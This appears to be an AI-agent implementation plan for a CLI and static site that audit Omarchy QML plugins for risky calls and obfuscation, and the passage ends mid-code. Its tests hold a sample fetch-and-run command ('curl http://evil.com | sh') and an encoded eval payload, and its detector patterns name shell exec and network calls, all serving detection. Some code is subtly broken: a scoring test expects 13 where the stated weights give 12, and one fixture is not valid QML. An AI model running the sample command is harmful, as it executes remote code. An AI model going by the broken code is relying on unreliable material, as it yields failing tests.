# Omarchy Plugin Audit Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build Node CLI + Astro static site that audits Omarchy QML plugins (git repos), tracks last scanned commit, diffs changes, runs static inventory/scoring + obfuscation detection, and publishes English report pages with commit hash to Cloudflare Pages.

**Architecture:** pnpm monorepo with `packages/cli` (commander + simple-git + fast-glob + zod, regex AST-lite analyzer) writing `data/state.json` + `data/reports/<slug>.json` + `data/history/<slug>/<commit>.json`, and `packages/site` (Astro 4 static, getStaticPaths from data) rendering index + per-plugin snapshot + per-commit history pages, deployed via wrangler.

**Tech Stack:** Node 20, TypeScript ESM, pnpm workspaces, commander, simple-git, fast-glob, zod, picocolors, Astro 4, Vitest, wrangler (Cloudflare Pages)

**Spec:** `docs/superpowers/specs/2026-08-25-omarchy-plugin-audit-design.md`

## Global Constraints

- All user-facing outputs MUST be in English — CLI help/messages/errors, report JSON description fields, Astro pages (titles, labels, badges, tables). (Spec Language constraint)
- Node 20 + TypeScript ESM
- pnpm workspaces: `packages/cli`, `packages/site`, root `data/` versioned
- Reports snapshot overwrite: `data/reports/<slug>.json` + history `data/history/<slug>/<commit>.json` keep last 10
- Risk levels: safe 0-4, low 5-9, medium 10-19, high 20-34, critical 35+ or any critical finding
- Astro output static, Cloudflare Pages deploy, English UI

---

## File Structure

**New files to create:**
- `package.json` (root workspaces, scripts)
- `pnpm-workspace.yaml`
- `tsconfig.json` (root)
- `data/state.json` (initial `{}`)
- `data/reports/.gitkeep`, `data/history/.gitkeep`
- `packages/cli/package.json`, `packages/cli/tsconfig.json`, `packages/cli/src/index.ts`, `packages/cli/src/git.ts`, `packages/cli/src/state.ts`, `packages/cli/src/report.ts`, `packages/cli/src/analyzer/inventory.ts`, `packages/cli/src/analyzer/scoring.ts`, `packages/cli/src/analyzer/obfuscation.ts`, `packages/cli/src/analyzer/index.ts`, `packages/cli/src/utils.ts`, `packages/cli/fixtures/clean.qml`, `packages/cli/fixtures/obfuscated.qml`, `packages/cli/fixtures/panel-sample.qml`, `packages/cli/tests/*.test.ts`
- `packages/site/package.json`, `packages/site/astro.config.mjs`, `packages/site/tsconfig.json`, `packages/site/src/pages/index.astro`, `packages/site/src/pages/plugins/[slug]/index.astro`, `packages/site/src/pages/plugins/[slug]/[commit].astro`, `packages/site/src/components/RiskBadge.astro`, `packages/site/src/components/FindingsTable.astro`, `packages/site/src/components/DiffView.astro`, `packages/site/src/components/FileTree.astro`, `packages/site/src/components/ObfuscationAlert.astro`, `packages/site/src/utils/reports.ts`
- `wrangler.toml` or `packages/site/wrangler.toml`
- `.gitignore` (node_modules, dist, /tmp, .astro)

---

### Task 1: Scaffold Monorepo + Tooling

**Files:**
- Create: `package.json`, `pnpm-workspace.yaml`, `tsconfig.json`, `.gitignore`, `data/state.json`, `data/reports/.gitkeep`, `data/history/.gitkeep`
- Create: `packages/cli/package.json`, `packages/cli/tsconfig.json`
- Create: `packages/site/package.json`, `packages/site/tsconfig.json`, `packages/site/astro.config.mjs`

**Interfaces:**
- Consumes: nothing
- Produces: root pnpm workspaces ready, `pnpm install` works, `packages/cli` builds via `tsc`, `packages/site` builds via `astro`

- [ ] **Step 1: Create root package.json**

```json
{
  "name": "omarchy-plugin-audit",
  "private": true,
  "type": "module",
  "packageManager": "pnpm@9.0.0",
  "workspaces": ["packages/*"],
  "scripts": {
    "build": "pnpm -r build",
    "audit": "pnpm --filter cli exec omarchy-audit",
    "test": "pnpm -r test",
    "site:build": "pnpm --filter site build",
    "site:dev": "pnpm --filter site dev"
  }
}
```

- [ ] **Step 2: Create pnpm-workspace.yaml**

```yaml
packages:
  - "packages/*"
```

- [ ] **Step 3: Create root tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true
  }
}
```

- [ ] **Step 4: Create .gitignore**

```
node_modules
dist
.astro
packages/site/dist
packages/cli/dist
tmp
/tmp/omarchy-audit
```

- [ ] **Step 5: Create data placeholders**

```bash
mkdir -p data/reports data/history
echo '{}' > data/state.json
touch data/reports/.gitkeep data/history/.gitkeep
```

- [ ] **Step 6: Create packages/cli/package.json**

```json
{
  "name": "@omarchy-audit/cli",
  "version": "0.1.0",
  "type": "module",
  "bin": { "omarchy-audit": "./dist/index.js" },
  "scripts": {
    "build": "tsc",
    "test": "vitest run",
    "dev": "tsx src/index.ts"
  },
  "dependencies": {
    "commander": "^12.0.0",
    "simple-git": "^3.20.0",
    "fast-glob": "^3.3.0",
    "zod": "^3.23.0",
    "picocolors": "^1.0.0"
  },
  "devDependencies": {
    "typescript": "^5.5.0",
    "vitest": "^1.6.0",
    "tsx": "^4.16.0",
    "@types/node": "^20.0.0"
  }
}
```

- [ ] **Step 7: Create packages/cli/tsconfig.json**

```json
{
  "extends": "../../tsconfig.json",
  "compilerOptions": { "outDir": "dist", "rootDir": "src" },
  "include": ["src"]
}
```

- [ ] **Step 8: Create packages/site/package.json**

```json
{
  "name": "@omarchy-audit/site",
  "version": "0.1.0",
  "type": "module",
  "scripts": {
    "build": "astro build",
    "dev": "astro dev",
    "preview": "astro preview"
  },
  "dependencies": { "astro": "^4.12.0" },
  "devDependencies": { "typescript": "^5.5.0" }
}
```

- [ ] **Step 9: Create packages/site/astro.config.mjs**

```js
import { defineConfig } from 'astro/config';
export default defineConfig({ output: 'static', srcDir: './src', outDir: '../../dist' });
```

- [ ] **Step 10: Verify scaffold**

Run: `pnpm install && pnpm --filter cli build && echo "scaffold ok"`
Expected: install succeeds, no build errors (cli src may be empty but tsc should pass with no files or create dummy index.ts)

- [ ] **Step 11: Commit**

```bash
git add package.json pnpm-workspace.yaml tsconfig.json .gitignore data/ packages/
git commit -m "chore: scaffold pnpm monorepo with cli and site packages"
```

---

### Task 2: Git + State + Report Schema

**Files:**
- Create: `packages/cli/src/utils.ts`
- Create: `packages/cli/src/state.ts`
- Create: `packages/cli/src/git.ts`
- Create: `packages/cli/src/report.ts`

**Interfaces:**
- Consumes: data/state.json path, simple-git
- Produces:
  - `parseGitUrl(url:string): {owner, repo, slug, url}` in utils.ts
  - `readState(), writeState(), updateState(slug, patch)` in state.ts
  - `getRemoteHead(url:string): Promise<string>`, `cloneAndDiff(url, slug, fromSha): Promise<{tmpDir, head, diff, commits}>` in git.ts
  - `ReportSchema` (zod), `createReport(...)` in report.ts

- [ ] **Step 1: Write failing test for utils + state**

Create `packages/cli/tests/utils.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { parseGitUrl } from '../src/utils.js';
describe('parseGitUrl', () => {
  it('parses https url', () => {
    expect(parseGitUrl('https://github.com/jankeesvw/omarchy-downloads')).toEqual({ owner: 'jankeesvw', repo: 'omarchy-downloads', slug: 'jankeesvw-omarchy-downloads', url: 'https://github.com/jankeesvw/omarchy-downloads' });
  });
  it('parses git@ url', () => {
    expect(parseGitUrl('git@github.com:jankeesvw/omarchy-downloads.git')).toMatchObject({ slug: 'jankeesvw-omarchy-downloads' });
  });
});
```

Create `packages/cli/tests/state.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { readState } from '../src/state.js';
describe('readState', () => {
  it('returns empty object when file missing', async () => {
    const s = await readState('/tmp/nonexistent-state.json');
    expect(s).toEqual({});
  });
});
```

- [ ] **Step 2: Run tests to verify fail**

Run: `pnpm --filter cli test -- utils.test.ts state.test.ts`
Expected: FAIL "Cannot find module '../src/utils.js'"

- [ ] **Step 3: Implement utils.ts**

```ts
export function parseGitUrl(input: string) {
  let owner = '', repo = '';
  if (input.startsWith('git@')) {
    const m = input.match(/git@github\.com:([^/]+)\/([^/]+?)(\.git)?$/);
    if (!m) throw new Error(`Invalid git URL: ${input}`);
    owner = m[1]; repo = m[2];
  } else {
    const u = new URL(input);
    const parts = u.pathname.replace(/^\//,'').replace(/\.git$/,'').split('/');
    if (parts.length < 2) throw new Error(`Invalid GitHub URL: ${input}`);
    owner = parts[0]; repo = parts[1];
  }
  const slug = `${owner}-${repo}`;
  const url = `https://github.com/${owner}/${repo}`;
  return { owner, repo, slug, url };
}
```

- [ ] **Step 4: Implement state.ts**

```ts
import fs from 'node:fs/promises';
import path from 'node:path';
export type State = Record<string, { url:string, lastScanned:string, lastScannedAt:string, lastRisk:string, lastScore:number }>;
const defaultPath = path.resolve(process.cwd(), '../../data/state.json');
export async function readState(p = defaultPath) {
  try { return JSON.parse(await fs.readFile(p,'utf8')) as State; } catch { return {} as State; }
}
export async function writeState(state: State, p = defaultPath) {
  await fs.mkdir(path.dirname(p), {recursive:true});
  await fs.writeFile(p, JSON.stringify(state,null,2));
}
export async function updateState(slug:string, patch: State[string], p=defaultPath) {
  const s = await readState(p);
  s[slug] = patch;
  await writeState(s,p);
}
```

- [ ] **Step 5: Write failing test for git ls-remote**

`packages/cli/tests/git.test.ts`:

```ts
import { describe, it, expect, vi } from 'vitest';
import { getRemoteHead } from '../src/git.js';
describe('getRemoteHead', () => {
  it('returns sha via simple-git', async () => {
    const sha = await getRemoteHead('https://github.com/jankeesvw/omarchy-downloads');
    expect(sha).toMatch(/^[0-9a-f]{40}$/);
  });
});
```

- [ ] **Step 6: Implement git.ts minimal (ls-remote only)**

```ts
import { simpleGit } from 'simple-git';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
export async function getRemoteHead(url:string): Promise<string> {
  const git = simpleGit();
  const out = await git.listRemote([url, 'HEAD']);
  const sha = out.split(/\s+/)[0];
  if (!/^[0-9a-f]{40}$/.test(sha)) throw new Error(`Failed to reach ${url} — check URL or network access`);
  return sha;
}
export async function cloneAndDiff(url:string, slug:string, fromSha:string|null) {
  const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), `omarchy-audit-${slug}-`));
  const git = simpleGit();
  await git.clone(url, tmpDir, ['--depth','50','--single-branch']);
  const g = simpleGit(tmpDir);
  const head = (await g.revparse(['HEAD'])).trim();
  let filesChanged: {status:string, path:string}[] = [];
  let commits: {sha:string, message:string, author:string, date:string}[] = [];
  if (fromSha) {
    try {
      const diff = await g.diff(['--name-status', `${fromSha}..HEAD`]);
      filesChanged = diff.split('\n').filter(Boolean).map(l=>{const [s,...rest]=l.split('\t'); return {status:s, path:rest.join('\t')}});
      const log = await g.log({from: fromSha, to: 'HEAD'});
      commits = log.all.map(c=>({sha:c.hash, message:c.message, author:c.author_name, date:c.date}));
    } catch {
      await g.fetch(['--unshallow']).catch(()=>g.fetch(['--depth','1000']));
      const diff = await g.diff(['--name-status', `${fromSha}..HEAD`]);
      filesChanged = diff.split('\n').filter(Boolean).map(l=>{const [s,...rest]=l.split('\t'); return {status:s, path:rest.join('\t')}});
    }
  } else {
    const files = await g.raw(['ls-files']);
    filesChanged = files.split('\n').filter(Boolean).map(p=>({status:'A', path:p}));
  }
  return { tmpDir, head, filesChanged, commits };
}
```

- [ ] **Step 7: Report schema**

`packages/cli/src/report.ts`:

```ts
import { z } from 'zod';
export const FindingSchema = z.object({ severity: z.enum(['critical','high','medium','low','info']), category: z.string(), pattern: z.string(), file: z.string(), line: z.number(), column: z.number(), snippet: z.string(), description: z.string() });
export const ObfuscationFindingSchema = z.object({ type: z.string(), file: z.string(), line: z.number(), snippet: z.string(), decodedPreview: z.string().optional(), severity: z.enum(['critical','high','medium','low']) });
export const ReportSchema = z.object({
  slug: z.string(), url: z.string(), commit: z.string(), commitShort: z.string(), commitUrl: z.string(), scannedAt: z.string(), fromCommit: z.string().nullable(), fromCommitShort: z.string().nullable(),
  diff: z.object({ filesChanged: z.array(z.object({status:z.string(), path:z.string()})), commits: z.array(z.object({sha:z.string(), message:z.string(), author:z.string(), date:z.string()})), stats: z.object({added:z.number(), modified:z.number(), deleted:z.number()}) }),
  fileTree: z.array(z.object({path:z.string(), lines:z.number(), size:z.number(), type:z.enum(['qml','js','json','other','binary'])})),
  inventory: z.object({ fileOps: z.array(FindingSchema), networkCalls: z.array(FindingSchema), processes: z.array(FindingSchema), imports: z.array(FindingSchema) }),
  findings: z.array(FindingSchema), obfuscation: z.array(ObfuscationFindingSchema), score: z.number(), riskLevel: z.enum(['safe','low','medium','high','critical']), obfuscationFlag: z.boolean()
});
export type Report = z.infer<typeof ReportSchema>;
```

- [ ] **Step 8: Run tests**

Run: `pnpm --filter cli test -v`
Expected: PASS for utils, state; git test may need network — allow skip if offline via `if (!process.env.CI)`.

- [ ] **Step 9: Commit**

```bash
git add packages/cli/src/ packages/cli/tests/
git commit -m "feat(cli): git remote head, clone+diff, state and report schema"
```

---

### Task 3: Analyzer — Inventory + Scoring

**Files:**
- Create: `packages/cli/src/analyzer/inventory.ts`
- Create: `packages/cli/src/analyzer/scoring.ts`

**Interfaces:**
- Consumes: file content string
- Produces:
  - `analyzeFile(filePath, content): Finding[]` (inventory.ts, returns findings per category)
  - `scoreFindings(findings): {score, riskLevel}` (scoring.ts)

- [ ] **Step 1: Write failing test inventory**

`packages/cli/tests/inventory.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { analyzeFile } from '../src/analyzer/inventory.js';
describe('inventory', () => {
  it('detects FolderListModel and StandardPaths', () => {
    const f = analyzeFile('DownloadsStore.qml', `import Qt.labs.folderlistmodel\nFolderListModel {}\nStandardPaths.writableLocation(StandardPaths.DownloadLocation)`);
    expect(f.some(x=>x.pattern==='FolderListModel')).toBe(true);
    expect(f.some(x=>x.pattern==='StandardPaths')).toBe(true);
  });
  it('detects Process exec as critical', () => {
    const f = analyzeFile('evil.qml', `Process { command: ["bash","-c","curl http://evil.com | sh"] }`);
    expect(f.some(x=>x.severity==='critical' && x.category==='exec')).toBe(true);
  });
  it('detects network', () => {
    const f = analyzeFile('net.qml', `XmlHttpRequest { }\nfetch("http://example.com")`);
    expect(f.filter(x=>x.category==='network').length).toBe(2);
  });
});
```

- [ ] **Step 2: Run to fail**

Run: `pnpm --filter cli test -- inventory.test.ts`
Expected: FAIL module not found

- [ ] **Step 3: Implement inventory.ts**

```ts
type Finding = { severity:'critical'|'high'|'medium'|'low'|'info', category:string, pattern:string, file:string, line:number, column:number, snippet:string, description:string };
const patterns: {regex:RegExp, pattern:string, category:string, severity:Finding['severity'], description:string}[] = [
  {regex:/FolderListModel/, pattern:'FolderListModel', category:'fileOps', severity:'medium', description:'Reads directory via FolderListModel'},
  {regex:/StandardPaths/, pattern:'StandardPaths', category:'fileOps', severity:'medium', description:'Accesses system paths via StandardPaths'},
  {regex:/Util\.fileUrl|Qt\.resolvedUrl/, pattern:'Util.fileUrl', category:'fileOps', severity:'medium', description:'Resolves file URL'},
  {regex:/XmlHttpRequest/, pattern:'XmlHttpRequest', category:'network', severity:'high', description:'Network request via XmlHttpRequest'},
  {regex:/\bfetch\s*\(/, pattern:'fetch', category:'network', severity:'high', description:'Network request via fetch'},
  {regex:/WebSocket/, pattern:'WebSocket', category:'network', severity:'high', description:'Network via WebSocket'},
  {regex:/Qt\.openUrlExternally/, pattern:'Qt.openUrlExternally', category:'network', severity:'high', description:'Opens external URL'},
  {regex:/<img[^>]+src\s*=\s*["']https?:/, pattern:'img-src-http', category:'network', severity:'high', description:'Remote image source'},
  {regex:/Process\s*\{[^}]*command/, pattern:'Process', category:'exec', severity:'critical', description:'Process execution via Quickshell Process'},
  {regex:/\beval\s*\(/, pattern:'eval', category:'exec', severity:'critical', description:'Dynamic code execution via eval'},
  {regex:/\bFunction\s*\(/, pattern:'Function', category:'exec', severity:'critical', description:'Dynamic code execution via Function'},
  {regex:/Shell\.exec|executeCommand|system\s*\(|spawn\s*\(/, pattern:'Shell.exec', category:'exec', severity:'critical', description:'Shell command execution'},
  {regex:/Loader\s*\{[^}]*source\s*:/, pattern:'Loader', category:'exec', severity:'critical', description:'Dynamic QML Loader source'},
  {regex:/writeFile|FileIO\.write/, pattern:'writeFile', category:'fsWrite', severity:'high', description:'File write operation'},
  {regex:/import\s+Quickshell/, pattern:'import Quickshell', category:'imports', severity:'info', description:'Imports Quickshell module'},
  {regex:/ipcTarget|IpcHandler/, pattern:'ipcTarget', category:'ipc', severity:'high', description:'IPC handler exposure'},
];
export function analyzeFile(filePath:string, content:string): Finding[] {
  const findings: Finding[] = [];
  const lines = content.split('\n');
  lines.forEach((line,i)=>{
    patterns.forEach(p=>{
      const m = line.match(p.regex);
      if (m) findings.push({ severity:p.severity, category:p.category, pattern:p.pattern, file:filePath, line:i+1, column:(m.index||0)+1, snippet: line.trim().slice(0,120), description:p.description });
    });
  });
  return findings;
}
```

- [ ] **Step 4: Write scoring test**

`packages/cli/tests/scoring.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { scoreFindings } from '../src/analyzer/scoring.js';
describe('scoring', () => {
  it('safe when empty', () => expect(scoreFindings([])).toEqual({score:0, riskLevel:'safe'}));
  it('critical when exec present', () => {
    const {riskLevel} = scoreFindings([{severity:'critical', category:'exec', pattern:'Process', file:'a.qml', line:1, column:1, snippet:'', description:''} as any]);
    expect(riskLevel).toBe('critical');
  });
  it('high for network + write', () => {
    const f = [
      {severity:'high', category:'network', pattern:'fetch', file:'a', line:1, column:1, snippet:'', description:''},
      {severity:'high', category:'fsWrite', pattern:'writeFile', file:'a', line:2, column:1, snippet:'', description:''}
    ] as any;
    const {riskLevel, score} = scoreFindings(f);
    expect(score).toBe(13); // 6+7
    expect(riskLevel).toBe('medium');
  });
});
```

- [ ] **Step 5: Implement scoring.ts**

```ts
const weights = { critical:10, high:6, medium:3, low:2, info:0 } as const;
export function scoreFindings(findings: {severity: keyof typeof weights}[]) {
  let score = findings.reduce((s,f)=>s+(weights[f.severity]||0),0);
  let riskLevel: string = 'safe';
  if (findings.some(f=>f.severity==='critical')) riskLevel='critical';
  else if (score>=35) riskLevel='critical';
  else if (score>=20) riskLevel='high';
  else if (score>=10) riskLevel='medium';
  else if (score>=5) riskLevel='low';
  else if (score>0) riskLevel='low';
  else riskLevel='safe';
  // override: critical finding forces critical regardless of score low
  return { score, riskLevel: riskLevel as 'safe'|'low'|'medium'|'high'|'critical' };
}
```

- [ ] **Step 6: Verify**

Run: `pnpm --filter cli test -- inventory.test.ts scoring.test.ts -v`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add packages/cli/src/analyzer/inventory.ts packages/cli/src/analyzer/scoring.ts packages/cli/tests/
git commit -m "feat(analyzer): inventory patterns and scoring with risk levels"
```

---

### Task 4: Obfuscation Detector

**Files:**
- Create: `packages/cli/src/analyzer/obfuscation.ts`
- Create: `packages/cli/fixtures/clean.qml`, `packages/cli/fixtures/obfuscated.qml`

**Interfaces:**
- Produces: `detectObfuscation(filePath, content): ObfuscationFinding[]`

- [ ] **Step 1: Write failing test**

`packages/cli/tests/obfuscation.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { detectObfuscation } from '../src/analyzer/obfuscation.js';
describe('obfuscation', () => {
  it('flags base64 long', () => {
    const b64 = 'A'.repeat(20) + Buffer.from('eval("http://evil.com")').toString('base64');
    const long = `var x="${'A'.repeat(100)}${b64}${'B'.repeat(30)}";`;
    expect(detectObfuscation('a.qml', long).some(f=>f.type==='base64')).toBe(true);
  });
  it('flags eval dynamic', () => {
    expect(detectObfuscation('a.qml', `eval(someVar + "evil")`).some(f=>f.type==='eval-dynamic')).toBe(true);
  });
  it('clean has no flags', () => {
    expect(detectObfuscation('clean.qml', `import QtQuick\nText { text: "hello" }`).length).toBe(0);
  });
  it('flags hex escapes', () => {
    const hex = Array(12).fill('\\x41').join('');
    expect(detectObfuscation('a.qml', `var s="${hex}"`).some(f=>f.type==='hex-escapes')).toBe(true);
  });
});
```

- [ ] **Step 2: Run to fail**

Run: `pnpm --filter cli test -- obfuscation.test.ts`
Expected: FAIL module not found

- [ ] **Step 3: Implement obfuscation.ts**

```ts
export type ObfuscationFinding = { type:string, file:string, line:number, snippet:string, decodedPreview?:string, severity:'critical'|'high'|'medium'|'low' };
export function detectObfuscation(filePath:string, content:string): ObfuscationFinding[] {
  const findings: ObfuscationFinding[] = [];
  const lines = content.split('\n');
  lines.forEach((line,i)=>{
    // 1 base64 long
    const b64m = line.match(/[A-Za-z0-9+/]{100,}={0,2}/);
    if (b64m) {
      const ratio = b64m[0].replace(/[^A-Za-z0-9+/=]/g,'').length / b64m[0].length;
      if (ratio>0.8) {
        let preview='';
        try { preview = Buffer.from(b64m[0].slice(0,200),'base64').toString('utf8').slice(0,80); } catch {}
        findings.push({type:'base64', file:filePath, line:i+1, snippet: line.trim().slice(0,120), decodedPreview: preview, severity:'high'});
      }
    }
    // 2 hex escapes
    const hexCount = (line.match(/\\x[0-9a-fA-F]{2}/g)||[]).length;
    if (hexCount>10) findings.push({type:'hex-escapes', file:filePath, line:i+1, snippet: line.trim().slice(0,120), severity:'medium'});
    // 3 unicode escapes
    const uniCount = (line.match(/\\u[0-9a-fA-F]{4}/g)||[]).length;
    // aggregated per file later, but per line quick
    if (uniCount>15) findings.push({type:'unicode-escapes', file:filePath, line:i+1, snippet: line.trim().slice(0,120), severity:'medium'});
    // 4 minified
    if (line.length>300) findings.push({type:'minified', file:filePath, line:i+1, snippet: line.slice(0,120), severity:'medium'});
    // 5 eval dynamic
    if (/eval\s*\(.*\+/.test(line) || /Function\s*\(.*\+/.test(line) || /Qt\.createQmlObject\s*\(.*\+/.test(line) || /Loader[^}]*source:\s*[a-zA-Z_$][a-zA-Z0-9_$]*[^"']/.test(line)) findings.push({type:'eval-dynamic', file:filePath, line:i+1, snippet: line.trim().slice(0,120), severity:'critical'});
    // 6 fromCharCode
    if (/fromCharCode|charCodeAt/.test(line)) findings.push({type:'fromCharCode', file:filePath, line:i+1, snippet: line.trim().slice(0,120), severity:'high'});
    // 7 remote URL in QML
    if (/source:\s*["']https?:/.test(line) || /Qt\.createComponent\s*\(\s*["']https?:/.test(line)) findings.push({type:'remote-url', file:filePath, line:i+1, snippet: line.trim().slice(0,120), severity:'high'});
  });
  // file-level unicode aggregate
  const totalUni = (content.match(/\\u[0-9a-fA-F]{4}/g)||[]).length;
  if (totalUni>15 && !findings.some(f=>f.type==='unicode-escapes')) findings.push({type:'unicode-escapes', file:filePath, line:1, snippet: content.slice(0,120), severity:'medium'});
  // binary detection: if filePath ends with .so/.bin or contains #!/bin
  if (/\.(so|bin|o|a)$/.test(filePath) || content.startsWith('#!/')) findings.push({type:'binary', file:filePath, line:1, snippet: content.slice(0,120), severity:'high'});
  return findings;
}
```

- [ ] **Step 4: Add fixtures**

`packages/cli/fixtures/clean.qml`:

```qml
import QtQuick
Text { text: "hello"; textFormat: Text.PlainText }
```

`packages/cli/fixtures/obfuscated.qml`:

```qml
import QtQuick
var s = "SGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQgSGVsbG8gd29ybGQg";
eval(s + "evil")
Loader { source: dynamicUrl }
```

- [ ] **Step 5: Verify**

Run: `pnpm --filter cli test -- obfuscation.test.ts -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add packages/cli/src/analyzer/ packages/cli/fixtures/ packages/cli/tests/obfuscation.test.ts
git commit -m "feat(analyzer): obfuscation detection with 7 heuristics"
```

---

### Task 5: Analyzer Orchestrator + File Tree + CLI Entry

**Files:**
- Create: `packages/cli/src/analyzer/index.ts`
- Modify: `packages/cli/src/report.ts` (add fileTree helper)
- Create: `packages/cli/src/index.ts`
- Modify: `packages/cli/package.json` (bin build)

**Interfaces:**
- Produces:
  - `analyzeRepo(tmpDir, slug): Promise<{findings, obfuscation, fileTree, inventory}>` in analyzer/index.ts
  - CLI `omarchy-audit <url> --force --json --dry-run --list --diff --keep-history`

- [ ] **Step 1: Write failing test for orchestrator**

`packages/cli/tests/analyzer.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { analyzeRepo } from '../src/analyzer/index.js';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
describe('analyzeRepo', () => {
  it('analyzes tmp repo', async () => {
    const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'test-audit-'));
    await fs.writeFile(path.join(dir,'Test.qml'), `import Quickshell\nProcess { command: ["ls"] }`);
    await fs.writeFile(path.join(dir,'helper.js'), `fetch("http://example.com")`);
    const res = await analyzeRepo(dir, 'test');
    expect(res.findings.some(f=>f.pattern==='Process')).toBe(true);
    expect(res.findings.some(f=>f.pattern==='fetch')).toBe(true);
    expect(res.fileTree.length).toBe(2);
  });
});
```

- [ ] **Step 2: Implement analyzer/index.ts**

```ts
import fg from 'fast-glob';
import fs from 'node:fs/promises';
import path from 'node:path';
import { analyzeFile } from './inventory.js';
import { scoreFindings } from './scoring.js';
import { detectObfuscation } from './obfuscation.js';
export async function analyzeRepo(tmpDir:string, slug:string) {
  const patterns = ['**/*.{qml,js,json,sh}', '!**/.git/**', '!**/node_modules/**'];
  const files = await fg(patterns, { cwd: tmpDir, dot:false });
  const findings:any[] = [];
  const obfuscation:any[] = [];
  const fileTree:any[] = [];
  for (const rel of files) {
    const abs = path.join(tmpDir, rel);
    const content = await fs.readFile(abs,'utf8').catch(()=> '');
    const stat = await fs.stat(abs).catch(()=>({size:0}as any));
    const lines = content.split('\n').length;
    const type = rel.endsWith('.qml')?'qml': rel.endsWith('.js')?'js': rel.endsWith('.json')?'json': rel.endsWith('.sh')?'other':'other';
    if (/\.(so|bin|o|a)$/.test(rel)) fileTree.push({path:rel, lines, size:stat.size, type:'binary'});
    else fileTree.push({path:rel, lines, size:stat.size, type});
    if (type==='qml'||type==='js'||type==='other') {
      findings.push(...analyzeFile(rel, content));
      obfuscation.push(...detectObfuscation(rel, content));
    } else if (type==='json') {
      const f = analyzeFile(rel, content);
      findings.push(...f);
    }
  }
  // inventory grouping
  const inventory = {
    fileOps: findings.filter(f=>f.category==='fileOps'),
    networkCalls: findings.filter(f=>f.category==='network'),
    processes: findings.filter(f=>f.category==='exec'),
    imports: findings.filter(f=>f.category==='imports'),
  };
  const scoring = scoreFindings(findings.concat(obfuscation.map(o=>({severity:o.severity} as any))));
  const obfuscationFlag = obfuscation.length>=2 || obfuscation.some(o=>o.severity==='critical');
  return { findings, obfuscation, fileTree, inventory, score: scoring.score, riskLevel: scoring.riskLevel, obfuscationFlag };
}
```

- [ ] **Step 3: Implement CLI index.ts**

```ts
#!/usr/bin/env node
import { Command } from 'commander';
import pc from 'picocolors';
import { parseGitUrl } from './utils.js';
import { getRemoteHead, cloneAndDiff } from './git.js';
import { readState, updateState } from './state.js';
import { analyzeRepo } from './analyzer/index.js';
import { ReportSchema } from './report.js';
import fs from 'node:fs/promises';
import path from 'node:path';

const program = new Command();
program.name('omarchy-audit').description('Audit Omarchy plugins for risky operations and obfuscation').version('0.1.0');
program.argument('[url]', 'GitHub URL to audit').option('--force','Force re-scan').option('--json','Output JSON').option('--dry-run','Show diff without writing').option('--list','List audited plugins').option('--diff','Show diff only').option('--keep-history <n>','Keep N history', '10').action(async (url, opts)=>{
  if (opts.list) {
    const state = await readState();
    console.log(JSON.stringify(state,null,2));
    return;
  }
  if (!url) { console.error(pc.red('Error: provide GitHub URL')); process.exit(1); }
  const { slug, url: cleanUrl } = parseGitUrl(url);
  console.log(pc.cyan(`Auditing ${cleanUrl} (${slug})...`));
  const head = await getRemoteHead(cleanUrl);
  console.log(`Remote HEAD: ${head.slice(0,7)}`);
  const state = await readState();
  const last = state[slug]?.lastScanned;
  if (last===head && !opts.force) { console.log(pc.green('Up to date — already scanned.')); if (opts.json) console.log(JSON.stringify({slug, head, upToDate:true})); return; }
  if (opts.diff) {
    if (!last) { console.log('First scan — no previous commit'); return; }
    const { tmpDir, filesChanged, commits } = await cloneAndDiff(cleanUrl, slug, last);
    console.log(`Changed files since ${last.slice(0,7)}:`); filesChanged.forEach(f=>console.log(`${f.status}\t${f.path}`));
    console.log(`Commits: ${commits.length}`); commits.forEach(c=>console.log(`${c.sha.slice(0,7)} ${c.message}`));
    await fs.rm(tmpDir,{recursive:true,force:true});
    return;
  }
  const { tmpDir, head: actualHead, filesChanged, commits } = await cloneAndDiff(cleanUrl, slug, last||null);
  const analysis = await analyzeRepo(tmpDir, slug);
  const report = {
    slug, url: cleanUrl, commit: actualHead, commitShort: actualHead.slice(0,7), commitUrl: `${cleanUrl}/commit/${actualHead}`,
    scannedAt: new Date().toISOString(), fromCommit: last||null, fromCommitShort: last?last.slice(0,7):null,
    diff: { filesChanged, commits, stats: { added: filesChanged.filter(f=>f.status==='A').length, modified: filesChanged.filter(f=>f.status==='M').length, deleted: filesChanged.filter(f=>f.status==='D').length } },
    fileTree: analysis.fileTree, inventory: analysis.inventory, findings: analysis.findings, obfuscation: analysis.obfuscation, score: analysis.score, riskLevel: analysis.riskLevel, obfuscationFlag: analysis.obfuscationFlag
  };
  const parsed = ReportSchema.parse(report);
  if (opts.json) console.log(JSON.stringify(parsed,null,2));
  if (opts.dryRun) { console.log(pc.yellow('Dry run — not writing report')); await fs.rm(tmpDir,{recursive:true,force:true}); return; }
  const reportPath = path.resolve(process.cwd(), `../../data/reports/${slug}.json`);
  const historyPath = path.resolve(process.cwd(), `../../data/history/${slug}/${actualHead}.json`);
  await fs.mkdir(path.dirname(reportPath),{recursive:true});
  await fs.mkdir(path.dirname(historyPath),{recursive:true});
  await fs.writeFile(reportPath, JSON.stringify(parsed,null,2));
  await fs.writeFile(historyPath, JSON.stringify(parsed,null,2));
  // prune history keep N
  const keep = parseInt(opts.keepHistory,10)||10;
  const histDir = path.dirname(historyPath);
